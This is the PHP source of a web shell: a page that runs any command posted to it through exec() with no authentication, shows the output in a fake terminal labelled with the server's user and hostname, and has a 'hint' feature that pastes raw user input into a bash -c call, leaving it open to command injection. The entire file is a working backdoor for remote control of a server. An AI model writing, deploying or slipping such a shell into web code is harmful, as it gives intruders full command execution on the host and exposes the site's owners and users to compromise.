<?php

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}

$user = get_current_user();
$hostname = gethostname();

$shell_row = $user .'@'. $hostname;

?>

<!DOCTYPE html>

<html>

    <head>
        <meta charset="UTF-8" />
        <title><?php echo $shell_row; ?>:~#</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <link crossorigin="anonymous" media="all" rel="stylesheet" href="index.css">
        <script>
            var shell_row = "<?php echo $shell_row; ?>";
        </script>
        <script type="text/javascript" src="index.js"></script>
    </head>

    <body>
        <div id="shell">
            <pre id="shell-content">
                
            </pre>
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                <div>
                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
                </div>
            </div>
        </div>
    </body>

</html>